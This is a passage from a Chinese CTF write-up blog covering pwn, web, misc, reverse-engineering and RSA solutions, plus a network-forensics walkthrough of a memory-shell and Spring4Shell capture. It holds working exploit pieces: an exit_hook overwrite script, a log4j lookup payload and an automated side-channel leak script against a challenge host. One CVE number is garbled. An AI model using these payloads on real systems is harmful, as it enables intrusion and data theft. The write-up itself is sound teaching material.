punctuation">)</span>exit_hook <span class="token operator">=</span> libc_delta <span class="token operator">+</span> <span class="token number">0x222060</span> <span class="token operator">+</span> <span class="token number">3848</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'WRITE MODE: '</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>exit_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="MyLinuxBot"><a href="#MyLinuxBot" class="headerlink" title="MyLinuxBot"></a>MyLinuxBot</h3><p>提示经典Java漏洞，log4j-jndi</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">${java:${env:FLAG}</span><span class="token punctuation">}</span></code></pre><h3 id="AirticleShare"><a href="#AirticleShare" class="headerlink" title="AirticleShare"></a>AirticleShare</h3><p>侧信道攻击，由于延时时间长，所以sleep要设置长一点</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> times <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>base_url <span class="token operator">=</span> <span class="token string">"http://112.74.185.213:46791/"</span>res <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url<span class="token punctuation">)</span>pos <span class="token operator">=</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'name="c" value="'</span><span class="token punctuation">)</span> <span class="token operator">+</span> len<span class="token punctuation">(</span><span class="token string">'name="c" value="'</span><span class="token punctuation">)</span>csrftoken <span class="token operator">=</span> res<span class="token punctuation">.</span>text<span class="token punctuation">[</span>pos<span class="token punctuation">:</span>pos<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span>ss <span class="token operator">=</span> <span class="token string">"1234567890abcdef"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> ss<span class="token punctuation">:</span>        payload <span class="token operator">=</span> f<span class="token string">"&lt;form data-parsley-validate>&lt;input data-parsley-required data-parsley-trigger=\"blur\" data-parsley-error-message='&lt;input type=\"input\" id=like value=\"rebirth_is_really_nb\">' data-parsley-errors-container=\"a[href^='/lookup.php?id={flag + j}']\" autofocus>&lt;/form>"</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'c'</span><span class="token punctuation">:</span> csrftoken<span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>        res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">"add.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(res.headers)</span>        location <span class="token operator">=</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Location'</span><span class="token punctuation">]</span>        pos <span class="token operator">=</span> location<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'id='</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span>        wp <span class="token operator">=</span> location<span class="token punctuation">[</span>pos<span class="token punctuation">:</span><span class="token punctuation">]</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'c'</span><span class="token punctuation">:</span> csrftoken<span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">:</span> wp<span class="token punctuation">}</span>        res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">"admin.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>f<span class="token string">"http://112.74.185.213:46791/lookup.php?id={wp}"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(res.text)</span>        txt <span class="token operator">=</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Liked by&lt;/h3>admin"</span> <span class="token operator">not</span> <span class="token keyword">in</span> txt<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>签到，关注公众号</p><h3 id="排队队吃果果"><a href="#排队队吃果果" class="headerlink" title="排队队吃果果"></a>排队队吃果果</h3><p>按列排序,根据格式仅有加粗和不加粗，所以只有0和1，测试加粗为1，不加粗为0</p><p>排序后替换加粗为1，不加粗为0</p><p>利用</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageMAX <span class="token operator">=</span> <span class="token number">25</span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>MAX<span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">)</span>str <span class="token operator">=</span> <span class="token string">"111"</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> y <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>pic<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>pic<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"flag.png"</span><span class="token punctuation">)</span>``</code></pre><p>得到二维码，扫码即使flag</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="justamat"><a href="#justamat" class="headerlink" title="justamat"></a>justamat</h3><p>经过分析就是一个矩阵，字符串矩阵相乘</p><pre class=" language-python"><code class="language-python">start<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x000000FE</span><span class="token punctuation">,</span> <span class="token number">0x0000000B</span><span class="token punctuation">,</span> <span class="token number">0x0000001D</span><span class="token punctuation">,</span> <span class="token number">0x000000F6</span><span class="token punctuation">,</span> <span class="token number">0x00000083</span><span class="token punctuation">,</span> <span class="token number">0x000000FF</span><span class="token punctuation">,</span> <span class="token number">0x000000E0</span><span class="token punctuation">,</span> <span class="token number">0x000000B8</span><span class="token punctuation">,</span>     <span class="token number">0x000000DD</span><span class="token punctuation">,</span> <span class="token number">0x000000B0</span><span class="token punctuation">,</span> <span class="token number">0x000000C5</span><span class="token punctuation">,</span> <span class="token number">0x000000DE</span><span class="token punctuation">,</span> <span class="token number">0x000000F6</span><span class="token punctuation">,</span> <span class="token number">0x00000014</span><span class="token punctuation">,</span> <span class="token number">0x0000009F</span><span class="token punctuation">,</span> <span class="token number">0x000000DD</span><span class="token punctuation">,</span>     <span class="token number">0x000000D9</span><span class="token punctuation">,</span> <span class="token number">0x00000007</span><span class="token punctuation">,</span> <span class="token number">0x0000002D</span><span class="token punctuation">,</span> <span class="token number">0x0000006B</span><span class="token punctuation">,</span> <span class="token number">0x00000019</span><span class="token punctuation">,</span> <span class="token number">0x000000CA</span><span class="token punctuation">,</span> <span class="token number">0x00000073</span><span class="token punctuation">,</span> <span class="token number">0x000000FD</span><span class="token punctuation">,</span>     <span class="token number">0x00000087</span><span class="token punctuation">,</span> <span class="token number">0x00000072</span><span class="token punctuation">,</span> <span class="token number">0x00000024</span><span class="token punctuation">,</span> <span class="token number">0x00000004</span><span class="token punctuation">,</span> <span class="token number">0x00000049</span><span class="token punctuation">,</span> <span class="token number">0x0000007E</span><span class="token punctuation">,</span> <span class="token number">0x000000A9</span><span class="token punctuation">,</span> <span class="token number">0x000000CE</span><span class="token punctuation">,</span>     <span class="token number">0x00000091</span><span class="token punctuation">,</span> <span class="token number">0x000000BE</span><span class="token punctuation">,</span> <span class="token number">0x00000041</span><span class="token punctuation">,</span> <span class="token number">0x00000018</span><span class="token punctuation">,</span> <span class="token number">0x00000060</span><span class="token punctuation">,</span> <span class="token number">0x0000003F</span><span class="token punctuation">,</span> <span class="token number">0x0000002B</span><span class="token punctuation">,</span> <span class="token number">0x00000063</span><span class="token punctuation">,</span>     <span class="token number">0x0000001C</span><span class="token punctuation">,</span> <span class="token number">0x000000D2</span><span class="token punctuation">,</span> <span class="token number">0x00000090</span><span class="token punctuation">,</span> <span class="token number">0x000000E9</span><span class="token punctuation">,</span> <span class="token number">0x0000008E</span><span class="token punctuation">,</span> <span class="token number">0x000000BA</span><span class="token punctuation">,</span> <span class="token number">0x0000001E</span><span class="token punctuation">,</span> <span class="token number">0x000000F3</span><span class="token punctuation">,</span>     <span class="token number">0x00000041</span><span class="token punctuation">,</span> <span class="token number">0x000000AD</span><span class="token punctuation">,</span> <span class="token number">0x0000002C</span><span class="token punctuation">,</span> <span class="token number">0x00000003</span><span class="token punctuation">,</span> <span class="token number">0x00000069</span><span class="token punctuation">,</span> <span class="token number">0x000000DA</span><span class="token punctuation">,</span> <span class="token number">0x00000010</span><span class="token punctuation">,</span> <span class="token number">0x000000FD</span><span class="token punctuation">,</span>     <span class="token number">0x000000FD</span><span class="token punctuation">,</span> <span class="token number">0x000000E7</span><span class="token punctuation">,</span> <span class="token number">0x00000006</span><span class="token punctuation">,</span> <span class="token number">0x00000036</span><span class="token punctuation">,</span> <span class="token number">0x000000D6</span><span class="token punctuation">,</span> <span class="token number">0x00000002</span><span class="token punctuation">,</span> <span class="token number">0x00000059</span><span class="token punctuation">,</span> <span class="token number">0x00000018</span><span class="token punctuation">,</span>     <span class="token number">0x000000CC</span><span class="token punctuation">,</span> <span class="token number">0x00000050</span><span class="token punctuation">,</span> <span class="token number">0x00000087</span><span class="token punctuation">,</span> <span class="token number">0x000000AF</span><span class="token punctuation">,</span> <span class="token number">0x000000FB</span><span class="token punctuation">,</span> <span class="token number">0x00000018</span><span class="token punctuation">,</span> <span class="token number">0x00000044</span><span class="token punctuation">,</span> <span class="token number">0x0000007F</span><span class="token punctuation">,</span>     <span class="token number">0x000000AD</span><span class="token punctuation">,</span> <span class="token number">0x000000F8</span><span class="token punctuation">,</span> <span class="token number">0x0000002C</span><span class="token punctuation">,</span> <span class="token number">0x00000067</span><span class="token punctuation">,</span> <span class="token number">0x0000001D</span><span class="token punctuation">,</span> <span class="token number">0x00000022</span><span class="token punctuation">,</span> <span class="token number">0x00000084</span><span class="token punctuation">,</span> <span class="token number">0x000000AC</span><span class="token punctuation">,</span>     <span class="token number">0x0000000E</span><span class="token punctuation">,</span> <span class="token number">0x00000023</span><span class="token punctuation">,</span> <span class="token number">0x000000DC</span><span class="token punctuation">,</span> <span class="token number">0x000000E6</span><span class="token punctuation">,</span> <span class="token number">0x000000BB</span><span class="token punctuation">,</span> <span class="token number">0x000000D2</span><span class="token punctuation">,</span> <span class="token number">0x000000B8</span><span class="token punctuation">,</span> <span class="token number">0x0000004A</span><span class="token punctuation">,</span>     <span class="token number">0x000000BC</span><span class="token punctuation">,</span> <span class="token number">0x000000DE</span><span class="token punctuation">,</span> <span class="token number">0x00000050</span><span class="token punctuation">,</span> <span class="token number">0x0000009C</span><span class="token punctuation">,</span> <span class="token number">0x0000001C</span><span class="token punctuation">,</span> <span class="token number">0x0000001E</span><span class="token punctuation">,</span> <span class="token number">0x00000086</span><span class="token punctuation">,</span> <span class="token number">0x0000003A</span><span class="token punctuation">,</span>     <span class="token number">0x0000002D</span><span class="token punctuation">,</span> <span class="token number">0x000000DD</span><span class="token punctuation">,</span> <span class="token number">0x000000C3</span><span class="token punctuation">,</span> <span class="token number">0x00000003</span><span class="token punctuation">,</span><span class="token punctuation">]</span>end<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">0x0001C633</span><span class="token punctuation">,</span> <span class="token number">0x0001DF94</span><span class="token punctuation">,</span> <span class="token number">0x00020EBF</span><span class="token punctuation">,</span> <span class="token number">0x0002BA40</span><span class="token punctuation">,</span> <span class="token number">0x0001E884</span><span class="token punctuation">,</span> <span class="token number">0x000260D1</span><span class="token punctuation">,</span> <span class="token number">0x0001F9B1</span><span class="token punctuation">,</span> <span class="token number">0x0001EA1A</span><span class="token punctuation">,</span>     <span class="token number">0x0001EEAA</span><span class="token punctuation">,</span> <span class="token number">0x0001DFB2</span><span class="token punctuation">,</span> <span class="token number">0x0001C1D0</span><span class="token punctuation">,</span> <span class="token number">0x0001EEF2</span><span class="token punctuation">,</span> <span class="token number">0x000216E1</span><span class="token punctuation">,</span> <span class="token number">0x0002BE00</span><span class="token punctuation">,</span> <span class="token number">0x0001FB5E</span><span class="token punctuation">,</span> <span class="token number">0x00025D74</span><span class="token punctuation">,</span>     <span class="token number">0x0001F000</span><span class="token punctuation">,</span> <span class="token number">0x000202D6</span><span class="token punctuation">,</span> <span class="token number">0x00020002</span><span class="token punctuation">,</span> <span class="token number">0x0001DDFE</span><span class="token punctuation">,</span> <span class="token number">0x0001C017</span><span class="token punctuation">,</span> <span class="token number">0x0001F08C</span><span class="token punctuation">,</span> <span class="token number">0x000227F6</span><span class="token punctuation">,</span> <span class="token number">0x0002C7BA</span><span class="token punctuation">,</span>     <span class="token number">0x000201AE</span><span class="token punctuation">,</span> <span class="token number">0x00027FBF</span><span class="token punctuation">,</span> <span class="token number">0x00020E21</span><span class="token punctuation">,</span> <span class="token number">0x0001FF5C</span><span class="token punctuation">,</span> <span class="token number">0x0001FD62</span><span class="token punctuation">,</span> <span class="token number">0x0001E948</span><span class="token punctuation">,</span> <span class="token number">0x0001BE6E</span><span class="token punctuation">,</span> <span class="token number">0x0001F4D7</span><span class="token punctuation">,</span>     <span class="token number">0x00022C8D</span><span class="token punctuation">,</span> <span class="token number">0x0002C353</span><span class="token punctuation">,</span> <span class="token number">0x0001F8DB</span><span class="token punctuation">,</span> <span class="token number">0x00026E1D</span><span class="token punctuation">,</span> <span class="token number">0x0001FF61</span><span class="token punctuation">,</span> <span class="token number">0x0001EA0F</span><span class="token punctuation">,</span> <span class="token number">0x0001F0D6</span><span class="token punctuation">,</span> <span class="token number">0x0001EDA8</span><span class="token punctuation">,</span>     <span class="token number">0x0001AD7D</span><span class="token punctuation">,</span> <span class="token number">0x00018218</span><span class="token punctuation">,</span> <span class="token number">0x0001CCD4</span><span class="token punctuation">,</span> <span class="token number">0x000239B6</span><span class="token punctuation">,</span> <span class="token number">0x0001AC4C</span><span class="token punctuation">,</span> <span class="token number">0x00020D7C</span><span class="token punctuation">,</span> <span class="token number">0x0001D967</span><span class="token punctuation">,</span> <span class="token number">0x0001A4F4</span><span class="token punctuation">,</span>     <span class="token number">0x0001CAD8</span><span class="token punctuation">,</span> <span class="token number">0x000196AE</span><span class="token punctuation">,</span> <span class="token number">0x0001831B</span><span class="token punctuation">,</span> <span class="token number">0x00017E45</span><span class="token punctuation">,</span> <span class="token number">0x0001D0CF</span><span class="token punctuation">,</span> <span class="token number">0x00023EDF</span><span class="token punctuation">,</span> <span class="token number">0x000181AE</span><span class="token punctuation">,</span> <span class="token number">0x00021760</span><span class="token punctuation">,</span>     <span class="token number">0x0001D3B4</span><span class="token punctuation">,</span> <span class="token number">0x000175D6</span><span class="token punctuation">,</span> <span class="token number">0x00017D3A</span><span class="token punctuation">,</span> <span class="token number">0x0001994F</span><span class="token punctuation">,</span> <span class="token number">0x0001189D</span><span class="token punctuation">,</span> <span class="token number">0x00014CCF</span><span class="token punctuation">,</span> <span class="token number">0x0001568E</span><span class="token punctuation">,</span> <span class="token number">0x00017EEB</span><span class="token punctuation">,</span>     <span class="token number">0x0001327E</span><span class="token punctuation">,</span> <span class="token number">0x00016A45</span><span class="token punctuation">,</span> <span class="token number">0x00012921</span><span class="token punctuation">,</span> <span class="token number">0x00011FF0</span><span class="token punctuation">,</span> <span class="token number">0x00013643</span><span class="token punctuation">,</span> <span class="token number">0x00011729</span><span class="token punctuation">,</span> <span class="token number">0x00015191</span><span class="token punctuation">,</span> <span class="token number">0x00017D17</span><span class="token punctuation">,</span>     <span class="token number">0x00017262</span><span class="token punctuation">,</span> <span class="token number">0x0001A863</span><span class="token punctuation">,</span> <span class="token number">0x00017010</span><span class="token punctuation">,</span> <span class="token number">0x00017B10</span><span class="token punctuation">,</span> <span class="token number">0x00014F9C</span><span class="token punctuation">,</span> <span class="token number">0x000143E8</span><span class="token punctuation">,</span> <span class="token number">0x00015E9B</span><span class="token punctuation">,</span> <span class="token number">0x0001242C</span><span class="token punctuation">,</span>     <span class="token number">0x0000F68C</span><span class="token punctuation">,</span> <span class="token number">0x0001192A</span><span class="token punctuation">,</span> <span class="token number">0x000150AD</span><span class="token punctuation">,</span> <span class="token number">0x0001B1A0</span><span class="token punctuation">,</span> <span class="token number">0x00014C60</span><span class="token punctuation">,</span> <span class="token number">0x000182AB</span><span class="token punctuation">,</span> <span class="token number">0x00013F4B</span><span class="token punctuation">,</span> <span class="token number">0x000141A6</span><span class="token punctuation">,</span>     <span class="token number">0x00015AA3</span><span class="token punctuation">,</span> <span class="token number">0x000135C9</span><span class="token punctuation">,</span> <span class="token number">0x0001D86F</span><span class="token punctuation">,</span> <span class="token number">0x0001E8FA</span><span class="token punctuation">,</span> <span class="token number">0x0002158D</span><span class="token punctuation">,</span> <span class="token number">0x0002BDAC</span><span class="token punctuation">,</span> <span class="token number">0x00020E4F</span><span class="token punctuation">,</span> <span class="token number">0x00027EE6</span><span class="token punctuation">,</span>     <span class="token number">0x000213B9</span><span class="token punctuation">,</span> <span class="token number">0x00020E86</span><span class="token punctuation">,</span> <span class="token number">0x000211FF</span><span class="token punctuation">,</span> <span class="token number">0x0001E1EF</span><span class="token punctuation">]</span><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>cin <span class="token operator">=</span><span class="token punctuation">[</span>Int<span class="token punctuation">(</span><span class="token string">"x[%d]"</span><span class="token operator">%</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span>S <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sum <span class="token operator">=</span> <span class="token number">0</span>        ofs <span class="token operator">=</span> k        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            sum<span class="token operator">+=</span><span class="token punctuation">(</span>cin<span class="token punctuation">[</span>j<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token operator">*</span>start<span class="token punctuation">[</span>ofs<span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        S<span class="token punctuation">.</span>add<span class="token punctuation">(</span>sum <span class="token operator">==</span> end<span class="token punctuation">[</span>j<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>ans <span class="token operator">=</span> S<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>ans <span class="token operator">=</span> S<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> cin<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>‍</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h3><pre class=" language-py"><code class="language-py">import gmpyfrom Crypto.Util.number import bytes_to_longfrom fractions import Fractionflag = "***"assert gmpy.is_prime(p) * gmpy.is_prime(q) > 0assert Fraction(p, p + 1) + Fraction(q + 1, q) == Fraction(2 * s - X, s + Y)print('p / (p + 1) + (q + 1) / q) == (2 * s - %s) / (s + %s)' % (X, Y))n = p * qc = pow(bytes_to_long(bytes(flag, "utf-8")), 0x10001, n)print('n =', n)print('c =', c)</code></pre><p>分析题目中所给的条件</p><pre class=" language-py"><code class="language-py"># -*- coding: utf-8 -*-"""Created on Sat Sep 16 22:40:42 2023@author: lenovo"""import sympyX = 153801856029563198525204130558738800846256680799373350925981555360388985602786501362501554433635610131437376183630577217917787342621398264625389914280509Y = 8086061902465799210233863613232941060876437002894022994953293934963170056653232109405937694010696299303888742108631749969054117542816358078039478109426n = 161010103536746712075112156042553283066813155993777943981946663919051986586388748662616958741697621238654724628406094469789970509959159343108847331259823125490271091357244742345403096394500947202321339572876147277506789731024810289354756781901338337411136794489136638411531539112369520980466458615878975406339p=sympy.symbols('p')q=sympy.symbols('q')s=sympy.symbols('s')exp=sympy.solve([n+q - s - Y, 2*n+p+q+1-2*s+X, p*q-n], (p,q,s))print(exp)</code></pre><p>得到p，q，s的值</p><pre class=" language-txt"><code class="language-txt">(p=12604273285023995463340817959574344558787108098986028639834181397979984443923512555395852711753996829630650627741178073792454428457548575860120924352450409, q=12774247264858490260286489817359549241755117653791190036750069541210299769639605520977166141575653832360695781409025914510310324035255606840902393222949771, s=161010103536746712075112156042553283066813155993777943981946663919051986586388748662616958741697621238654724628406094469789970509959159343108847331259823138256432294313269203421659050140817247896562556361172161032623037006361409872307045649661542219054272855881029305328814299453639438693256941440232720246684)</code></pre><p>然后就是常规rsa</p><pre class=" language-py"><code class="language-py">from Crypto.Util.numberimport gmpy2p = 12604273285023995463340817959574344558787108098986028639834181397979984443923512555395852711753996829630650627741178073792454428457548575860120924352450409q = 12774247264858490260286489817359549241755117653791190036750069541210299769639605520977166141575653832360695781409025914510310324035255606840902393222949771e=65537n = 161010103536746712075112156042553283066813155993777943981946663919051986586388748662616958741697621238654724628406094469789970509959159343108847331259823125490271091357244742345403096394500947202321339572876147277506789731024810289354756781901338337411136794489136638411531539112369520980466458615878975406339c = 15380535750650959213679345560658190067564859611922563753882617419201718847747207949211621591882732604480600745000879508274349808435529637573773711729853565120321608048340424321537282281161623712479117497156437792084977778826238039385697230676340978078264209760724043776058017336241110097549146883806481148999phi=(p-1)*(q-1)d=gmpy2.invert(e,phi)m=pow(c,d,n)print(long_to_bytes(m))</code></pre><p>b’flag{2a5a9c6fe94da5ef7edeffebb506b29a}’</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023陇剑杯 WP</title>
      <link href="/2023/09/14/2023%E9%99%87%E5%89%91%E6%9D%AF/"/>
      <url>/2023/09/14/2023%E9%99%87%E5%89%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="2023陇剑杯"><a href="#2023陇剑杯" class="headerlink" title="2023陇剑杯"></a>2023陇剑杯</h1><h2 id="HW"><a href="#HW" class="headerlink" title="HW"></a>HW</h2><h3 id="hard-web-1"><a href="#hard-web-1" class="headerlink" title="hard_web_1"></a>hard_web_1</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26193435-20230910201121-1wpn7n9.png" alt="2023-08-26193435">​</p><p>首先判断哪个是服务器地址</p><p>​<img src="/Blogimages/2023longjiancup/image-20230910203726-z53v39k.png" alt="image">​</p><p>从响应包看，给客户端返回数据包的就是服务器</p><p>所以确定服务器地址是<code>192.168.162.188</code>​</p><p>再从开放端口来看，长期开放的端口</p><pre class=" language-xml"><code class="language-xml">客户端发送一个TCP SYN包（同步请求），其中包含目标IP地址和要访问的端口号。服务器收到SYN包后，如果端口是开放的，它会向客户端发送一个TCP SYN-ACK包（同步应答），以表示端口是开放的，并准备接受连接请求。客户端在收到服务器的SYN-ACK包后，会向服务器发送一个TCP ACK包（确认应答），以建立连接。一旦连接建立，数据可以在客户端和服务器之间传输。</code></pre><p>所以用语句：</p><pre class=" language-filter"><code class="language-filter">tcp.connection.synack && ip.dst==192.168.162.188</code></pre><p>​<img src="/Blogimages/2023longjiancup/image-20230910204721-gkaydpn.png" alt="image">​</p><p>所以就是80、888、8888</p><h3 id="hard-web-2"><a href="#hard-web-2" class="headerlink" title="hard_web_2"></a>hard_web_2</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26193548-20230910204813-fqyecef.png" alt="2023-08-26193548">​</p><p>按照包名顺序找到HTTP的包</p><p>​<img src="/Blogimages/2023longjiancup/image-20230910205126-hrpmty8.png" alt="image">​</p><p>找到回显开始是200且命令执行的地方</p><p>这里追踪HTTP流只能看到注入内存马的地方，更远的地方看不到了</p><p>所以就从最后一个创建内存马的包入手</p><p>​<img src="/Blogimages/2023longjiancup/image-20230910205517-1zxrf5l.png" alt="image">​</p><p>可以看到AES加密和密钥</p><p>找到的流量复制为16进制</p><p>​<img src="/Blogimages/2023longjiancup/image-20230910205931-6lweqpw.png" alt="image"></p><p>复制多余的地方直接丢到vscode替换</p><p>​​<img src="/Blogimages/2023longjiancup/image-20230910210411-pxdyiwx.png" alt="image">​​</p><p>上厨子解密：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230910205903-m3blh8o.png" alt="image">​</p><p>打开就是flag</p><p>​<img src="/Blogimages/2023longjiancup/image-20230910210615-18f2n0z.png" alt="image">​​</p><h3 id="hard-web-3"><a href="#hard-web-3" class="headerlink" title="hard_web_3"></a>hard_web_3</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26193612-20230910210645-rig9dg4.png" alt="2023-08-26193612">​</p><p>‍</p><p>数据包tcp.stream eq 20052的回显发现：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230910212049-ejegn4z.png" alt="image">​</p><p>结合前面的748007e861908c03，用脚本爆破密钥</p><p>或者直接cmd5解密</p><p>‍</p><h2 id="SS"><a href="#SS" class="headerlink" title="SS"></a>SS</h2><h3 id="SS1"><a href="#SS1" class="headerlink" title="SS1"></a>SS1</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26193649-20230911075054-lbdf6zy.png" alt="2023-08-26193649">​</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911075215-on7bfod.png" alt="image">​</p><p>先看数据包</p><p>找到Hello路由的第一个数据包：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911075436-8gw5nya.png" alt="image">​</p><p>可以看到class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D;</p><p>直接上网：</p><p>​<img src="/Blogimages/2023longjiancup/image-20230911075523-uyrtbj5.png" alt="image">​</p><p>CVE-2022022965</p><h3 id="ss2"><a href="#ss2" class="headerlink" title="ss2"></a>ss2</h3><p>​<img src="/Blogimages/2023longjiancup/2023-08-26201640-20230911075551-4tt4ps6.png" alt="2023-08-26201640">​</p><p>​<img 